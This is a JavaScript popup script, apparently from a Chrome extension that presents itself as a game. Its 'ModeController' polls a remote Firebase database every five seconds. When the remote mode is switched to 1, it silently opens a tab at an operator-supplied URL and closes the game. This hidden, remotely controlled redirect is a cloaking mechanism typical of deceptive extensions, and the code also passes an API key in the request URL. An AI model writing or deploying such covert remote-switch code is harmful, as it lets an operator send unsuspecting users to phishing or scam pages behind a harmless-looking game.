// Contrôleur de mode
class ModeController {
  constructor() {
    this.mode = 0;
    this.url = 'https://google.com';
    this.init();
  }

  async init() {
    await this.checkMode();
    setInterval(() => this.checkMode(), 5000);
  }

  async checkMode() {
    try {
      const res = await fetch(`${FIREBASE_DB_URL}/mode_control.json?auth=${FIREBASE_API_KEY}`);
      if (!res.ok) {
        // Firebase non configuré, utiliser mode par défaut
        this.applyDefaultMode();
        return;
      }
      const data = await res.json();
      if (!data) {
        // Pas de données, utiliser mode par défaut
        this.applyDefaultMode();
        return;
      }
      
      const newMode = parseInt(data.number) || 0;
      const newUrl = data.url || 'https://google.com';
      
      if (newMode !== this.mode || (newMode === 1 && newUrl !== this.url)) {
        this.mode = newMode;
        this.url = newUrl;
        this.apply();
      }
    } catch (e) {
      // Erreur Firebase, utiliser mode par défaut
      this.applyDefaultMode();
    }
  }

  applyDefaultMode() {
    // Mode jeu par défaut
    if (this.mode !== 0) {
      this.mode = 0;
      this.apply();
    }
  }

  apply() {
    if (this.mode === 0) {
      const gameContainer = document.getElementById('gameContainer');
      const urlContainer = document.getElementById('urlContainer');
      if (gameContainer) gameContainer.style.display = 'flex';
      if (urlContainer) urlContainer.style.display = 'none';
    } else {
      chrome.tabs.create({url: this.url}, () => window.close());
    }
  }
}

document.addEventListener('DOMContentLoaded', () => {
  new ModeController();
});

